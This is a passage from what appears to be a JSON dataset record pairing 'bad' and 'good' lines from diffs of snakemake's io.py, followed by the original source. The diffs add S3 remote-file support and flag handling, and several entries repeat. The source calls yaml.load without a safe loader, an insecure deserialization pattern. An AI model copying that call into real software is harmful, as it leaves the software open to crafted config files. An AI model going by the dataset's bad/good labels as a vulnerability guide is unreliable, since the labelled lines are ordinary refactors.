getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]},{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath 